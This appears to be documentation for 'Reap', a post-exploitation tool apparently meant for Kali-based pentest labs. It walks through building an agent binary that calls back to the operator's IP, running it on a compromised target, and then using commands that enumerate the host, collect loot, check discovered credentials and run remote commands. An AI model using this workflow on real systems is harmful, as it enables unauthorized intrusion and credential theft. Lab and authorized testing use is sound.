# Connect a target to Reap

You need a working shell on the target and Reap installed on Kali. Reap creates one file to copy to that target. You do not install Go or Python on the target.

## 1. Make the file on Kali

Open Reap:

```bash
reap
```

At the `reap>` prompt, type:

```text
agent
```

Reap asks for:

- Your Kali IP address that the target can reach. In a VPN lab, use your VPN IP, such as `10.10.14.2`.
- The type of target: Linux PC, Linux ARM, or Windows PC.

Reap prints the file it created and the next commands. For a typical Linux target, the file is `reap-agent`. For Windows, it is `reap-agent.exe`.

## 2. Copy that file to the target

Use the file transfer method you already have. Copy just `reap-agent` or `reap-agent.exe`.

The connection settings are already inside it. Keep the filename so the commands below work as written.

## 3. Start waiting on Kali

In Reap:

```text
agent listen
```

Keep this running while you start the target file. Reap waits for 60 seconds. If it stops waiting, run the same command again.

## 4. Run the file on the target

In the **Linux target shell**, change to the directory where you copied the file and run:

```bash
chmod +x reap-agent
./reap-agent
```

For **Windows**, run this in the target's PowerShell from the directory containing the file:

```powershell
.\reap-agent.exe
```

Leave the agent running. On Kali, Reap reports the connection and returns to its prompt.

## Work in Reap

These commands go in **Reap on Kali**:

```text
enum
run
findings
!whoami
```

`enum` shows what is on the target. `run` collects loot and checks discovered credentials. `findings` shows the results. A command beginning with `!` runs on the connected target.

When finished, use `exit` in Reap or Ctrl-C in the target shell to close the connection. Delete the copied file from the target. The agent does not install itself as a service.

## Next time

To reconnect using the same file, run `agent listen` in Reap, then run the file on the target again. `agent show` repeats its instructions.

To make a new Linux agent without the setup questions, use your reachable IP:

```text
agent create 10.10.14.2
```

If that filename already exists, add `--output new-agent` to choose another name. Run the new name on the target.

For Windows, add `--target windows`. For Linux ARM, add `--target linux-arm64`.

`agent list` shows your saved setups. `agent show NAME` repeats a setup's instructions, and `agent listen NAME` waits for it. Use the name shown by `agent list`. The saved settings stay on Kali when you close Reap, so you can reuse the copied file.

If Reap reports that ready-to-run files are missing, use the [prepared build installation](USAGE.md#install-a-prepared-build-with-the-agent).

For connection errors, different ports, and output paths, see [agent options and troubleshooting](USAGE.md#agent-options-and-saved-setups).
